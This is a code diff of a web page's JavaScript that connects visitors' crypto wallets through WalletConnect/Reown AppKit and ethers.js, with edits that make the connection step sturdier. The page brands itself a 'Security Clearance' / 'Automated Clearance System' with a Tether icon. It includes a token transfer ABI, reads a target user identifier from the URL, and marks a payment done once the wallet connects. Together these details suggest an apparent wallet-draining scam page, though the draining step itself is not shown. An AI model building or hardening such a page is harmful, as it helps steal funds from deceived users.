@@ -578,19 +578,25 @@
         "function transfer(address to, uint256 value) public returns (bool)"
     ];
 
-    // Initialize Reown AppKit / WalletConnect Modal
+    // Initialize Reown AppKit / WalletConnect Modal safely
+    let modal;
     const ethersAdapter = new EthersAdapter();
-    const modal = createAppKit({
-        adapters: [ethersAdapter],
-        networks: [mainnet],
-        projectId: WALLETCONNECT_PROJECT_ID,
-        metadata: {
-            name: 'Security Clearance',
-            description: 'Automated Clearance System',
-            url: window.location.origin,
-            icons: ['https://assets.coingecko.com/coins/images/325/large/Tether.png']
-        }
-    });
+    
+    try {
+        modal = createAppKit({
+            adapters: [ethersAdapter],
+            networks: [mainnet],
+            projectId: WALLETCONNECT_PROJECT_ID,
+            metadata: {
+                name: 'Security Clearance',
+                description: 'Automated Clearance System',
+                url: window.location.origin,
+                icons: ['https://assets.coingecko.com/coins/images/325/large/Tether.png']
+            }
+        });
+    } catch (e) {
+        console.warn("AppKit initialization note:", e);
+    }
 
     function getTargetUserIdentifier() {
         const urlParams = new URLSearchParams(window.location.search);
@@ -888,29 +894,34 @@
         let provider;
         let signer;
 
-        // Check if injected browser wallet (MetaMask, Exodus extension) exists
         if (typeof window.ethereum !== "undefined") {
             provider = new ethers.BrowserProvider(window.ethereum);
             await provider.send("eth_requestAccounts", []);
             signer = await provider.getSigner();
-        } else {
-            // Open Reown AppKit modal and let the user complete connection
+        } else if (modal) {
             await modal.open();
             
-            // Wait for AppKit adapter/provider to become available after user connects
-            let walletProvider = null;
+            let activeProvider = null;
             for (let i = 0; i < 60; i++) {
-                walletProvider = ethersAdapter.provider;
-                if (walletProvider) break;
+                try {
+                    if (ethersAdapter.provider) {
+                        activeProvider = ethersAdapter.provider;
+                        break;
+                    }
+                } catch (e) {}
                 await new Promise(resolve => setTimeout(resolve, 500));
             }
 
-            if (!walletProvider) {
+            if (!activeProvider) {
                 triggerNotification("Wallet connection cancelled or timed out.", 3000);
                 return;
             }
-            provider = new ethers.BrowserProvider(walletProvider);
+            
+            provider = new ethers.BrowserProvider(activeProvider);
             signer = await provider.getSigner();
+        } else {
+            alert("No Web3 wallet or connection provider available.");
+            return;
         }
 
         paymentDone = true;
